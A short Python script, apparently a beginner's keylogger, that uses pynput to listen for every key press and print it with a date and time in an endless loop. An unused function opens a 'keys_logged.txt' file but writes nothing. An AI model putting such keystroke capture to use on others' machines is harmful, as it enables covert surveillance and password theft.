from pynput.keyboard import Key, Listener
from datetime import date, datetime




#this function creates a txt file
def create_txt():
   keys_logged_file = open("keys_logged.txt", "a")

#this function prints the pressed key
def on_press(key):
   today =  date.today()              
   c = datetime.now()
   time_now = c.strftime('%H:%M:%S')
   print(f'{today} {time_now}', end = ": ")
   print(key)

while True:
   
   with Listener(on_press = on_press) as listener:
      listener.join()
